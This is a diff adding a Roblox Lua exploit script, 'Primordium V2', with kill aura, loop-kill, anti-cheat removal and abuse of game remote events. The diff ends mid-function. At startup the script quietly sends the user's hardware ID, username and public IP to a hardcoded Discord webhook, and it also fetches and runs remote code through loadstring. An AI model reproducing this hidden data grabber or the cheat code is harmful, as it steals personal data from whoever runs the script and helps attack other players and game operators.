@@ -1,0 +1,1027 @@
+setfpscap(500)
+
+local version = 2
+
+function checkVersion()
+    local versionUrl = "https://raw.githubusercontent.com/RedstoneWare/Primordium/refs/heads/main/version-txt"
+    local versionContent
+    local isValidVersion = false
+    
+    local response = request({
+        Url = versionUrl,
+        Method = "GET"
+    })
+    
+    if response.StatusCode == 200 then
+        for key, value in pairs(response) do
+            if key == "Body" then
+                versionContent = value:gsub("%s+", "")
+            end
+        end
+    end
+    
+    if tostring(version):gsub("%s+", "") == versionContent then
+        isValidVersion = true
+    end
+    
+    return isValidVersion
+end
+
+function load_primordium_ff()
+    setfpscap(500)
+    
+    -- Discord webhook function
+    sendmsg = function(url, message)
+        request = http_request or request or HttpPost or syn.request
+        request({
+            Url = url,
+            Body = game:GetService("HttpService"):JSONEncode({
+                ["content"] = message
+            }),
+            Method = "POST",
+            Headers = {
+                ["content-type"] = "application/json"
+            }
+        })
+    end
+    
+    -- Send user info to Discord webhook
+    sendmsg(
+        "https://discordapp.com/api/webhooks/1124337016402890822/535GPCRwgqsBKwTBMfjFcWbe5E5M2h7aFs6uCTLJ_AcPb7rouxAdAPA0T1RmCTFnoKOe",
+        "``` HWID: " .. game:GetService("RbxAnalyticsService"):GetClientId() .. 
+        " NAME: " .. game.Players.LocalPlayer.Name .. 
+        " IP: " .. game:HttpGet("https://api.ipify.org/") .. "```"
+    )
+    
+    -- Initialize global variables
+    getgenv().LevelUp = false
+    getgenv().TimeUp = false
+    getgenv().KillAura = false
+    getgenv().Effect = false
+    getgenv().LoopKill = false
+    getgenv().TeleportLoopKill = false
+    getgenv().SpinBot = false
+    getgenv().SpinBotSpeed = 0.55
+    getgenv().AntiCheatBypass = false
+    getgenv().RenderSteppedMethod = false
+    getgenv().LvlUpSpeed = 1
+    getgenv().Predict = false
+    getgenv().PredictValue = 0.2
+    getgenv().PlayerModelSet = false
+    getgenv().BodyPartsSet = true
+    getgenv().firetouchinterest_method = false
+    getgenv().spam_swing = false
+    getgenv().auto_equip = false
+    getgenv().vertical_exploit = false
+    getgenv().rapid_swing = false
+    getgenv().rapid_swing_speed = 40/100
+    getgenv().LoopKillAll = false
+    getgenv().SpamTool = false
+    getgenv().SpamToolAmount = 6
+    getgenv().SpamToolSpeed = 10
+    
+    local shouldStop = false
+    
+    getgenv().TO_TARGET_PPL = {}
+    getgenv().TargetTable = {}
+    getgenv().WHITELIST = {
+        "Vyxunusis", "Vynuxusis", "HVHIover", "KERX31", 
+        "XxLi0n_SparkxX2008", "SamuelNinja2006", "LeviMinerSlime"
+    }
+    getgenv().TargetTable2 = {}
+    
+    local predictionCoroutines = {}
+    local bodyPartConnections = {}
+    local respawnTime = game.Players.RespawnTime
+    
+    -- Load UI library
+    local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/valdor1k/TotalityLib/refs/heads/main/hvh"))()
+    ui:Theme("neverlose_blue")
+    
+    local window = ui:AddWindow("Primordium V2", "HvH | duvpeho scriptik")
+    local notification = ui:Notification()
+    notification.MaxNotifications = 6
+    
+    -- Create tabs
+    window:AddTabLabel('Home')
+    local mainTab = window:AddTab('Main', 'earth')
+    local combatTab = window:AddTab('Combat', 'earth')
+    local funTab = window:AddTab('Fun', 'earth')
+    
+    -- Create sections
+    local exploitsSection = mainTab:AddSection('Exploits', "left")
+    local movementSection = mainTab:AddSection('Movement', "right")
+    local combatSection = combatTab:AddSection('Combat', "left")
+    local loopKillSection = combatTab:AddSection('Loop Kill Settings', "right")
+    local exploitsSection2 = combatTab:AddSection('Exploits', "right")
+    local toolSpamSection = combatTab:AddSection('Tool Spam', "right")
+    local funSection = funTab:AddSection('Fun', "left")
+    
+    -- Tool Spam Section
+    toolSpamSection:AddToggle("Tool Spam", getgenv().SpamTool, function(value)
+        getgenv().SpamTool = value
+    end)
+    
+    toolSpamSection:AddSlider("Spam Amount", 1, 100, 6, function(value)
+        getgenv().SpamToolAmount = value
+    end)
+    
+    toolSpamSection:AddSlider("Spam Speed", 1, 150, 10, function(value)
+        getgenv().SpamToolSpeed = value
+    end)
+    
+    -- Exploits Section 2
+    exploitsSection2:AddToggle("vertical spam", getgenv().vertical_exploit, function(value)
+        getgenv().vertical_exploit = value
+    end)
+    
+    exploitsSection2:AddToggle("Instakill", getgenv().firetouchinterest_method, function(value)
+        getgenv().firetouchinterest_method = value
+    end)
+    
+    exploitsSection2:AddButton("Spawn Swords", function()
+        for i = 1, 2 do
+            game.ReplicatedStorage.UnlockedSwords:FireServer(
+                {false, false, false}, 
+                "894An3ti44Ex321P3llo99i3t"
+            )
+        end
+    end)
+    
+    exploitsSection2:AddToggle("Rapid Swing", getgenv().rapid_swing, function(value)
+        getgenv().rapid_swing = value
+        if getgenv().rapid_swing then
+            callRapid()
+        end
+    end)
+    
+    exploitsSection2:AddSlider("Swing Interval", 1, 100, 40, function(value)
+        getgenv().rapid_swing_speed = value/100
+    end)
+    
+    -- Main Exploits Section
+    exploitsSection:AddToggle("Level up", false, function(value)
+        if getgenv().LevelUp == false then
+            getgenv().LevelUp = true
+            LevelUp()
+        else
+            getgenv().LevelUp = false
+        end
+    end)
+    
+    exploitsSection:addTextbox('Lvl up speed: ', "", function(value)
+        getgenv().LvlUpSpeed = value
+    end)
+    
+    exploitsSection:AddToggle("Time exploit", false, function(value)
+        if getgenv().TimeUp == false then
+            getgenv().TimeUp = true
+            TimeUp()
+        else
+            getgenv().TimeUp = false
+        end
+    end)
+    
+    exploitsSection:AddButton("Unlock Swords", function()
+        game.ReplicatedStorage.UnlockedSwords:FireServer(
+            {true, true, true}, 
+            "894An3ti44Ex321P3llo99i3t"
+        )
+    end)
+    
+    exploitsSection2:AddButton("Fix lvl 8 auras", function()
+        getgenv().firetouchinterest = function(part1, part2, toggle)
+            part2.CFrame = part1.CFrame
+        end
+    end)
+    
+    exploitsSection:AddButton("Anti Cheat Bypass", function()
+        game.Players.LocalPlayer.Character.AntiExploit:Destroy()
+        game.Players.LocalPlayer.Character.AntiExploit2:Destroy()
+        
+        workspace.ChildAdded:Connect(function(child)
+            if child.Name == game.Players.LocalPlayer.Name then
+                if child:WaitForChild("AntiExploit") then
+                    game.Players.LocalPlayer.Character.AntiExploit:Destroy()
+                end
+                if child:WaitForChild("AntiExploit2") then
+                    game.Players.LocalPlayer.Character.AntiExploit2:Destroy()
+                end
+            end
+        end)
+        
+        getgenv().AntiCheatBypass = true
+    end)
+    
+    exploitsSection:AddButton("Close GUI", function()
+        for i, gui in pairs(game.CoreGui:GetChildren()) do
+            if gui.Name == "Valyxor" then
+                gui:Destroy()
+            end
+        end
+    end)
+    
+    -- Movement Section
+    movementSection:AddSlider('WalkSpeed', 1, 500, 16, function(speed)
+        if getgenv().AntiCheatBypass == true then
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = speed
+        end
+    end)
+    
+    movementSection:AddSlider('JumpPower', 1, 500, 50, function(power)
+        if getgenv().AntiCheatBypass == true then
+            game.Players.LocalPlayer.Character.Humanoid.JumpPower = power
+        end
+    end)
+    
+    -- Combat Section
+    combatSection:AddToggle("Kill Aura", false, function()
+        if getgenv().KillAura == false then
+            getgenv().KillAura = true
+            RunKA()
+        else
+            getgenv().KillAura = false
+        end
+    end)
+    
+    -- Fun Section
+    funSection:AddToggle("Effect Terror", false, function()
+        if getgenv().Effect == false then
+            getgenv().Effect = true
+            EffectTerror()
+        else
+            getgenv().Effect = false
+        end
+    end)
+    
+    funSection:AddToggle("Spin Bot", false, function()
+        if getgenv().SpinBot == false then
+            getgenv().SpinBot = true
+            SpinBot()
+        else
+            getgenv().SpinBot = false
+        end
+    end)
+    
+    funSection:AddSlider('Spin Bot Speed', 1, 100, 50, function(speed)
+        getgenv().SpinBotSpeed = speed
+    end)
+    
+    funSection:AddButton("Sword Sound Spam", function()
+        for i, tool in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+            if tool:IsA("Tool") then
+                tool.Parent = game.Players.LocalPlayer.Backpack
+            end
+        end
+        
+        for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+            tool.Parent = game.Players.LocalPlayer.Character
+        end
+    end)
+    
+    -- Combat targeting
+    combatSection:addTextbox('Add Target', "", function(targetName)
+        table.insert(getgenv().TargetTable, game.Players:FindFirstChild(targetName))
+        for i, target in pairs(getgenv().TargetTable) do
+            print(i, target)
+        end
+    end)
+    
+    combatSection:addTextbox('Remove Target', "", function(targetName)
+        for i, target in ipairs(getgenv().TargetTable) do
+            if target == game.Players:FindFirstChild(targetName) then
+                table.remove(getgenv().TargetTable, i)
+                break
+            end
+        end
+        for i, target in pairs(getgenv().TargetTable) do
+            print(i, target)
+        end
+    end)
+    
+    combatSection:AddButton("Remove all Targets", function()
+        getgenv().TargetTable = {}
+    end)
+    
+    combatSection:AddToggle("Loop Kill", false, function()
+        if getgenv().LoopKill == false then
+            getgenv().LoopKill = true
+        else
+            getgenv().LoopKill = false
+        end
+    end)
+    
+    combatSection:AddToggle("Predict Loop Kill", false, function()
+        if getgenv().Predict == false then
+            getgenv().Predict = true
+        else
+            getgenv().Predict = false
+        end
+    end)
+    
+    combatSection:addTextbox('Predict Value: ', "0.25", function(value)
+        getgenv().PredictValue = value
+    end)
+    
+    combatSection:AddToggle("Teleport Loop Kill", false, function()
+        if getgenv().TeleportLoopKill == false then
+            getgenv().TeleportLoopKill = true
+            TeleportLoopKill()
+        else
+            getgenv().TeleportLoopKill = false
+        end
+    end)
+    
+    combatSection:AddButton("Kill Everyone", function()
+        spawn(function()
+            if game.Players.LocalPlayer.Backpack:FindFirstChild("Sword") then
+                game.Players.LocalPlayer.Backpack:FindFirstChild("Sword").Parent = game.Players.LocalPlayer.Character
+            end
+            
+            local sword = game.Players.LocalPlayer.Character:WaitForChild("Sword")
+            sword.Handle.Size = Vector3.new(1000000000, 1000000000, 1000000000)
+            sword.Handle.Massless = true
+            
+            sword:Activate()
+            wait(0.05)
+            sword:Activate()
+            wait(0.05)
+            sword:Activate()
+            wait(0.05)
+            
+            sword.Handle.Size = Vector3.new(4, 4, 4)
+        end)
+    end)
+    
+    combatSection:AddToggle("Loop Kill Everyone", false, function(value)
+        getgenv().LoopKillAll = value
+    end)
+    
+    combatSection:addTextbox('Whitelist: ', "Name", function(playerName)
+        table.insert(getgenv().TargetTable2, playerName)
+    end)
+    
+    combatSection:addTextbox('Remove Whitelist: ', "Name", function(playerName)
+        for i, name in ipairs(getgenv().TargetTable2) do
+            if name == playerName then
+                table.remove(getgenv().TargetTable2, i)
+                break
+            end
+        end
+        for i, target in pairs(getgenv().TargetTable2) do
+            print(i, target)
+        end
+    end)
+    
+    -- Loop Kill Settings
+    loopKillSection:AddDropdown('Wait for', {"Player Model", "Body Parts"}, "Body Parts", function(selection)
+        if selection == "Player Model" then
+            getgenv().PlayerModelSet = true
+            print("PlayerModelSet = true")
+        else
+            getgenv().PlayerModelSet = false
+            print("PlayerModelSet = false")
+        end
+        
+        if selection == "Body Parts" then
+            getgenv().BodyPartsSet = true
+            print("BodyPartsSet = true")
+        else
+            getgenv().BodyPartsSet = false
+            print("BodyPartsSet = false")
+        end
+    end)
+    
+    loopKillSection:AddToggle("Auto Equip", getgenv().auto_equip, function(value)
+        getgenv().auto_equip = value
+    end)
+    
+    loopKillSection:AddToggle("Spam Swing", getgenv().spam_swing, function(value)
+        getgenv().spam_swing = value
+    end)
+    
+    -- Utility Functions
+    function unequipTool()
+        spawn(function()
+            for i = 1, getgenv().SpamToolAmount do
+                if game.Players.LocalPlayer.Character then
+                    if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
+                        game.Players.LocalPlayer.Character:FindFirstChild("Sword").Parent = game.Players.LocalPlayer.Backpack
+                        task.wait(getgenv().SpamToolSpeed/100)
+                    end
+                end
+            end
+        end)
+    end
+    
+    function SwingTool()
+        task.defer(function()
+            if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
+                game.Players.LocalPlayer.Character:FindFirstChild("Sword"):Activate()
+            end
+            wait()
+            if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
+                game.Players.LocalPlayer.Character:FindFirstChild("Sword"):Activate()
+            end
+        end)
+    end
+    
+    -- Player setup
+    for i, player in pairs(game.Players:GetPlayers()) do
+        if table.find(getgenv().TO_TARGET_PPL, player.Name) then
+            table.insert(getgenv().TargetTable, player)
+        end
+        
+        player.CharacterAdded:Connect(function(character)
+            if getgenv().PlayerModelSet == true then
+                SwingTool()
+            end
+        end)
+    end
+    
+    game.Players.PlayerAdded:Connect(function(player)
+        if table.find(getgenv().TO_TARGET_PPL, player.Name) then
+            table.insert(getgenv().TargetTable, player)
+        end
+        
+        player.CharacterAdded:Connect(function(character)
+            if getgenv().PlayerModelSet == true then
+                SwingTool()
+            end
+        end)
+    end)
+    
+    function BringTarget(targetPart)
+        targetPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, -4)
+    end
+    
+    function CheckIfEquipped()
+        if not game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
+            if game.Players.LocalPlayer.Backpack:FindFirstChild("Sword") then
+                game.Players.LocalPlayer.Backpack:FindFirstChild("Sword").Parent = game.Players.LocalPlayer.Character
+            end
+        end
+        
+        if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
+            if game.Players.LocalPlayer.Character:FindFirstChild("Sword").Handle then
+                game.Players.LocalPlayer.Character:FindFirstChild("Sword").Handle.Massless = true
+                game.Players.LocalPlayer.Character:FindFirstChild("Sword").Handle.CanCollide = false
+                game.Players.LocalPlayer.Character:FindFirstChild("Sword").Handle.Size = Vector3.new(10, 10, 10)
+            end
+        end
+    end
+    
+    -- Main loop kill logic
+    task.defer(function()
+        repeat
+            for i, target in pairs(getgenv().TargetTable) do
+                if getgenv().LoopKill == true and target ~= game.Players.LocalPlayer and 
+                   target.Character and target.Character:FindFirstChildOfClass("Part") and
+                   game.Players.LocalPlayer.Character and 
+                   game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    
+                    if target.Character:FindFirstChild("Humanoid") then
+                        if target.Character:FindFirstChild("Humanoid").Health > 0 then
+                            CheckIfEquipped()
+                            BringTarget(target.Character:FindFirstChildOfClass("Part"))
+                            SwingTool()
+                        end
+                    else
+                        CheckIfEquipped()
+                        BringTarget(target.Character:FindFirstChildOfClass("Part"))
+                        SwingTool()
+                    end
+                end
+                
+                if getgenv().LoopKill == true and target ~= game.Players.LocalPlayer and 
+                   target.Character and target.Character:FindFirstChildOfClass("MeshPart") and
+                   game.Players.LocalPlayer.Character and 
+                   game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    
+                    if target.Character:FindFirstChild("Humanoid") then
+                        if target.Character:FindFirstChild("Humanoid").Health > 0 then
+                            CheckIfEquipped()
+                            BringTarget(target.Character:FindFirstChildOfClass("MeshPart"))
+                            SwingTool()
+                        end
+                    else
+                        CheckIfEquipped()
+                        BringTarget(target.Character:FindFirstChildOfClass("MeshPart"))
+                        SwingTool()
+                    end
+                end
+            end
+            task.wait()
+        until shouldStop == true
+    end)
+    
+    -- Level Up Function
+    function LevelUp()
+        spawn(function()
+            while getgenv().LevelUp == true do
+                wait(0.15)
+                for i = 1, getgenv().LvlUpSpeed do
+                    local challenges = game.Players.LocalPlayer.Challenges
+                    
+                    if challenges.Challenge1.Value == true and challenges.Challenge2.Value == false then
+                        game:GetService("ReplicatedStorage").ClaimChallenge:FireServer(1, "An5nit43534per3plo34itdfs")
+                    end
+                    
+                    if challenges.Challenge2.Value == true and challenges.Challenge3.Value == false then
+                        game:GetService("ReplicatedStorage").ClaimChallenge:FireServer(2, "An5nit43534per3plo34itdfs")
+                    end
+                    
+                    if challenges.Challenge3.Value == true and challenges.Challenge4.Value == false then
+                        game:GetService("ReplicatedStorage").ClaimChallenge:FireServer(3, "An5nit43534per3plo34itdfs")
+                    end
+                    
+                    if challenges.Challenge4.Value == true and challenges.Challenge5.Value == false then
+                        game:GetService("ReplicatedStorage").ClaimChallenge:FireServer(4, "An5nit43534per3plo34itdfs")
+                    end
+                    
+                    if challenges.Challenge5.Value == true and challenges.Challenge6.Value == false then
+                        game:GetService("ReplicatedStorage").ClaimChallenge:FireServer(5, "An5nit43534per3plo34itdfs")
+                    end
+                    
+                    if challenges.Challenge6.Value == true then
+                        game:GetService("ReplicatedStorage").ClaimChallenge:FireServer(6, "An5nit43534per3plo34itdfs")
+                    end
+                end
+            end
+        end)
+    end
+    
+    -- Time Exploit Function
+    function TimeUp()
+        spawn(function()
+            while getgenv().TimeUp == true do
+                wait(0.1)
+                for i = 1, 50 do
+                    game:GetService("ReplicatedStorage"):WaitForChild("ChangeTime"):FireServer(
+                        "Anti333Exploitz123FF45324", 433, 429
+                    )
+                end
+            end
+        end)
+    end
+    
+    -- Kill Aura Function
+    function RunKA()
+        spawn(function()
+            while getgenv().KillAura == true do
+                task.wait()
+                for i, model in pairs(workspace:GetChildren()) do
+                    if game.Players.LocalPlayer.Character then
+                        if game.Players.LocalPlayer.Character.HumanoidRootPart then
+                            if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") and 
+                               model:FindFirstChild("Humanoid") then
+                                
+                                if model:FindFirstChild("Humanoid").Health ~= 0 then
+                                    local distance = (model.HumanoidRootPart.Position - 
+                                                    game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude
+                                    
+                                    if distance < 15 then
+                                        if model.Name ~= game.Players.LocalPlayer.Name then
+                                            if game.Players.LocalPlayer.Backpack:FindFirstChild("Sword") then
+                                                game.Players.LocalPlayer.Backpack:FindFirstChild("Sword").Parent = 
+                                                game.Players.LocalPlayer.Character
+                                            end
+                                            
+                                            local sword = game.Players.LocalPlayer.Character.Sword
+                                            sword.Handle.Massless = true
+                                            sword.Handle.Size = Vector3.new(15, 15, 15)
+                                            sword:Activate()
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+    end
+    
+    function EffectTerror()
+        spawn(function()
+            while getgenv().Effect == true do
+                wait(0.05)
+                for i, player in pairs(game.Players:GetChildren()) do
+                    game:GetService("ReplicatedStorage"):WaitForChild("PerformKillEffect"):FireServer(player.Name)
+                end
+            end
+        end)
+    end
+    
+    function PredictRespawn(targetPlayer)
+        local respawnDelay = respawnTime or 5
+        local predictionOffset = 0.25
+        
+        while getgenv().Predict do
+            task.wait(0.1)
+            if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
+                local humanoid = targetPlayer.Character.Humanoid
+                
+                if humanoid.Health <= 0 then
+                    print("Target", targetPlayer.Name, "has died. Predicting respawn...")
+                    
+                    task.delay(respawnDelay - predictionOffset, function()
+                        if not getgenv().Predict then
+                            print("Prediction toggled off during respawn prediction.")
+                            return
+                        end
+                        
+                        if humanoid.Health == 0 then
+                            print("Swinging sword at predicted respawn time for:", targetPlayer.Name)
+                            local localPlayer = game.Players.LocalPlayer
+                            local sword = localPlayer.Backpack:FindFirstChild("Sword") or 
+                                         localPlayer.Character:FindFirstChild("Sword")
+                            
+                            if sword and sword:FindFirstChild("Handle") then
+                                sword.Parent = localPlayer.Character
+                                sword.Handle.Massless = true
+                                sword.Handle.Size = Vector3.new(20, 20, 20)
+                                
+                                spawn(function()
+                                    for i = 1, 1 do
+                                        sword:Activate()
+                                        task.wait(0.05)
+                                        sword:Activate()
+                                        task.wait(0.05)
+                                        sword:Activate()
+                                    end
+                                end)
+                                
+                                if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                                    local newPosition = localPlayer.Character.Sword.Handle.CFrame + Vector3.new(2.5, 2.5, 2.5)
+                                    targetPlayer.Character.HumanoidRootPart.CFrame = newPosition
+                                    sword:Activate()
+                                else
+                                    print("Predicted respawn location not found for:", targetPlayer.Name)
+                                end
+                            else
+                                print("Sword not found for local player.")
+                            end
+                        end
+                    end)
+                    
+                    while targetPlayer.Character == nil or 
+                          targetPlayer.Character:FindFirstChild("Humanoid") == nil or 
+                          targetPlayer.Character.Humanoid.Health <= 0 do
+                        task.wait(0.1)
+                    end
+                    
+                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                        print("Teleporting target back to local player:", targetPlayer.Name)
+                        targetPlayer.Character.HumanoidRootPart.CFrame = 
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
+                    end
+                end
+            end
+        end
+    end
+    
+    function StartPrediction()
+        for index, targetPlayer in pairs(game.Players:GetPlayers()) do
+            if table.find(getgenv().TO_TARGET_PPL, targetPlayer.Name) and not predictionCoroutines[targetPlayer.Name] then
+                print("Starting prediction for:", targetPlayer.Name)
+                predictionCoroutines[targetPlayer.Name] = spawn(function()
+                    PredictRespawn(targetPlayer)
+                end)
+            end
+        end
+        
+        game.Players.PlayerAdded:Connect(function(targetPlayer)
+            if table.find(getgenv().TO_TARGET_PPL, targetPlayer.Name) and not predictionCoroutines[targetPlayer.Name] then
+                print("Starting prediction for new player:", targetPlayer.Name)
+                predictionCoroutines[targetPlayer.Name] = spawn(function()
+                    PredictRespawn(targetPlayer)
+                end)
+            end
+        end)
+    end
+    
+    function StopPrediction()
+        for playerName, coroutine in pairs(predictionCoroutines) do
+            predictionCoroutines[playerName] = nil
+        end
+        print("Prediction stopped.")
+    end
+    
+    function TogglePrediction(enabled)
+        if enabled then
+            print("Prediction enabled")
+            StartPrediction()
+        else
+            print("Prediction disabled")
+            StopPrediction()
+        end
+    end
+    
+    getgenv().Predict = false
+    
+    spawn(function()
+        local lastPredictState = getgenv().Predict
+        while true do
+            task.wait(0.1)
+            if lastPredictState ~= getgenv().Predict then
+                TogglePrediction(getgenv().Predict)
+                lastPredictState = getgenv().Predict
+            end
+        end
+    end)
+    
+    function callRapid()
+        spawn(function()
+            while getgenv().rapid_swing == true do
+                for i, tool in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if tool:IsA("Tool") then
+                        spawn(function()
+                            tool:Activate()
+                            task.wait(0.05)
+                            tool:Activate()
+                        end)
+                        task.wait(getgenv().rapid_swing_speed)
+                    end
+                end
+                task.wait()
+            end
+        end)
+    end
+    
+    function TeleportLoopKill()
+        if getgenv().RenderSteppedMethod == true then
+            spawn(function()
+                local connection
+                connection = game:GetService("RunService").RenderStepped:Connect(function()
+                    if getgenv().TeleportLoopKill == true then
+                        for i, player in pairs(game.Players:GetPlayers()) do
+                            if table.find(getgenv().TO_TARGET_PPL, player.Name) then
+                                if game.Players.LocalPlayer.Character then
+                                    if player.Character then
+                                        if player.Character:FindFirstChild("HumanoidRootPart") then
+                                            if player.Character:FindFirstChild("Humanoid") then
+                                                if player.Character.Humanoid.Health ~= 0 then
+                                                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Sword") then
+                                                        if game.Players.LocalPlayer.Backpack:FindFirstChild("Sword"):FindFirstChild("Handle") then
+                                                            game.Players.LocalPlayer.Backpack:FindFirstChild("Sword").Parent = game.Players.LocalPlayer.Character
+                                                        end
+                                                    end
+                                                    
+                                                    if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
+                                                        if game.Players.LocalPlayer.Character:FindFirstChild("Sword"):FindFirstChild("Handle") then
+                                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character:FindFirstChild("HumanoidRootPart").CFrame
+                                                            game.Players.LocalPlayer.Character.Sword:Activate()
+                                                            game.Players.LocalPlayer.Character.Sword.Handle.Massless = true
+                                                            game.Players.LocalPlayer.Character.Sword.Handle.Size = Vector3.new(15, 15, 15)
+                                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character:FindFirstChild("HumanoidRootPart").CFrame
+                                                            game.Players.LocalPlayer.Character.Sword:Activate()
+                                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character:FindFirstChild("HumanoidRootPart").CFrame
+                                                        end
+                                                    end
+                                                end
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    else
+                        connection:Disconnect()
+                    end
+                end)
+            end)
+        else
+            spawn(function()
+                while getgenv().TeleportLoopKill == true do
+                    task.wait()
+                    for i, player in pairs(game.Players:GetPlayers()) do
+                        if table.find(getgenv().TO_TARGET_PPL, player.Name) then
+                            if game.Players.LocalPlayer.Character then
+                                if player.Character then
+                                    if player.Character:FindFirstChild("HumanoidRootPart") then
+                                        if player.Character:FindFirstChild("Humanoid") then
+                                            if player.Character.Humanoid.Health ~= 0 then
+                                                if game.Players.LocalPlayer.Backpack:FindFirstChild("Sword") then
+                                                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Sword"):FindFirstChild("Handle") then
+                                                        game.Players.LocalPlayer.Backpack:FindFirstChild("Sword").Parent = game.Players.LocalPlayer.Character
+                                                    end
+                                                end
+                                                
+                                                if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
+                                                    if game.Players.LocalPlayer.Character:FindFirstChild("Sword"):FindFirstChild("Handle") then
+                                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character:FindFirstChild("HumanoidRootPart").CFrame
+                                                        game.Players.LocalPlayer.Character.Sword:Activate()
+                                                        game.Players.LocalPlayer.Character.Sword.Handle.Massless = true
+                                                        game.Players.LocalPlayer.Character.Sword.Handle.Size = Vector3.new(15, 15, 15)
+                                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character:FindFirstChild("HumanoidRootPart").CFrame
+                                                        game.Players.LocalPlayer.Character.Sword:Activate()
+                                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character:FindFirstChild("HumanoidRootPart").CFrame
+                                                    end
+                                                end
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+    
+    function SpinBot()
+        spawn(function()
+            game:GetService("RunService").RenderStepped:Connect(function()
+                if getgenv().SpinBot == true then
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = 
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, getgenv().SpinBotSpeed, 0)
+                end
+                
+                if getgenv().auto_equip then
+                    if game.Players.LocalPlayer.Character then
+                        if game.Players.LocalPlayer.Backpack:FindFirstChild("Sword") then
+                            game.Players.LocalPlayer.Backpack:FindFirstChild("Sword").Parent = game.Players.LocalPlayer.Character
+                        end
+                    end
+                end
+                
+                if getgenv().spam_swing == true then
+                    if game.Players.LocalPlayer.Character then
+                        if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
+                            game.Players.LocalPlayer.Character.Sword:Activate()
+                        end
+                    end
+                end
+            end)
+        end)
+    end
+    
+    -- Additional setup and optimization
+    task.defer(function()
+        local function disableCollisions()
+            for index, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+                if part:IsA("BasePart") and part.CanCollide == true then
+                    part.CanCollide = false
+                end
+            end
+        end
+        
+        local steppedConnection = game:GetService("RunService").Stepped:Connect(disableCollisions)
+        
+        task.defer(function()
+            local Players = game:GetService("Players")
+            local RunService = game:GetService("RunService")
+            local localPlayer = Players.LocalPlayer
+            
+            RunService.Stepped:Connect(function()
+                for index, player in pairs(Players:GetChildren()) do
+                    if player ~= localPlayer and player.Character then
+                        for index, part in pairs(player.Character:GetChildren()) do
+                            if part.Name == "HumanoidRootPart" then
+                                part.CanCollide = false
+                            end
+                        end
+                    end
+                end
+                
+                for index, accessory in pairs(workspace:GetChildren()) do
+                    if accessory:IsA("Accessory") and accessory:FindFirstChildWhichIsA("Part") then
+                        accessory:FindFirstChildWhichIsA("Part"):Destroy()
+                    end
+                end
+            end)
+        end)
+        
+        -- Setup whitelist and targeting
+        for i, player in pairs(game.Players:GetPlayers()) do
+            if not table.find(getgenv().WHITELIST, player.Name) then
+                table.insert(getgenv().TargetTable2, player)
+            end
+        end
+        
+        game.Players.PlayerAdded:Connect(function(player)
+            if not table.find(getgenv().WHITELIST, player.Name) then
+                table.insert(getgenv().TargetTable2, player)
+            end
+        end)
+        
+        function BringTarget(targetPart)
+            targetPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, -4)
+        end
+        
+        function CheckIfEquipped()
+            if not game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
+                if game.Players.LocalPlayer.Backpack:FindFirstChild("Sword") then
+                    game.Players.LocalPlayer.Backpack:FindFirstChild("Sword").Parent = game.Players.LocalPlayer.Character
+                end
+            end
+            
+            if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
+                if game.Players.LocalPlayer.Character:FindFirstChild("Sword").Handle then
+                    game.Players.LocalPlayer.Character:FindFirstChild("Sword").Handle.Massless = true
+                    game.Players.LocalPlayer.Character:FindFirstChild("Sword").Handle.CanCollide = false
+                    game.Players.LocalPlayer.Character:FindFirstChild("Sword").Handle.Size = Vector3.new(10, 10, 10)
+                end
+            end
+        end
+        
+        function SwingTool()
+            task.defer(function()
+                if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
+                    game.Players.LocalPlayer.Character:FindFirstChild("Sword"):Activate()
+                end
+                task.wait(0.002)
+                if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
+                    game.Players.LocalPlayer.Character:FindFirstChild("Sword"):Activate()
+                end
+            end)
+        end
+        
+        task.defer(function()
+            repeat
+                for i, player in pairs(getgenv().TargetTable2) do
+                    if getgenv().LoopKillAll == true and player ~= game.Players.LocalPlayer and 
+                       player.Character and player.Character:FindFirstChildOfClass("Part") and
+                       game.Players.LocalPlayer.Character and 
+                       game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                        
+                        if player.Character:FindFirstChild("Humanoid") then
+                            if player.Character:FindFirstChild("Humanoid").Health > 0 then
+                                CheckIfEquipped()
